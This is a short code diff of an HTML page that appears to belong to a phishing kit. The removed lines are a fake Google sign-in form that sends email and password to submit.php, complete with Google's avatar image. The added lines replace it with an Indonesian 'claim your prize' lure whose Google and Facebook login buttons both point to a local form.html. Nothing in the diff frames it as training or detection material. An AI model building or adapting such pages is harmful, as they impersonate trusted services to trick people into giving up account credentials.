@@ -1,18 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Google Sign In</title>
+    <title>Login untuk Klaim</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="login-box">
-        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" width="80">
-        <h2>Sign in</h2>
-        <form action="submit.php" method="POST">
-            <input type="email" name="email" placeholder="Email or phone" required>
-            <input type="password" name="password" placeholder="Enter your password" required>
-            <button type="submit">Next</button>
-        </form>
+    <div class="login-container">
+        <h2>Klaim Hadiah Kamu</h2>
+        <p>Login menggunakan salah satu metode di bawah ini:</p>
+        <div class="login-buttons">
+            <a href="form.html" class="google-btn">Login with Google</a>
+            <a href="form.html" class="fb-btn">Login with Facebook</a>
+        </div>
     </div>
 </body>
 </html>
